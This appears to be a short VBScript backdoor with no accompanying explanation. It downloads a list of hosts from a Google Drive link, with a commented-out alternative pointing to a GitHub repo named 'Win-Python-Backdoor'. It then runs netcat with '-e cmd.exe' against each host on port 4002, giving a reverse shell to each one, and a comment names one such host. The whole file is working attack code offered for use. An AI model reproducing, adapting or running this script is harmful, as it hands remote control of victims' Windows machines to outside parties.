set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
dim url
  'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
  url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
'msgbox  url&"site.txt"
'xmlhttp.open "get", url&"site.txt", false
xmlhttp.open "get", url, false
xmlhttp.send
strOutput = xmlhttp.responseText
a=Split(strOutput,",")
Set oShell = CreateObject ("WScript.Shell") 

for each x in a
    'msgbox x
    'nc64.exe -w 10 -e cmd.exe config02.addns.org 4002
    oShell.run "nc64.exe -w 10 -e cmd.exe "&x&" 4002"
next

'strOutput = split(xmlhttp.responseText,"Stable release</a>")(1)
'strOutput = split(strOutput,"<small>")(0)
'strOutput = replace(replace(strOutput,vbcr,""),vblf,"")
'strOutput = split(strOutput,"<p>")(1)

'msgbox "Version: " & strOutput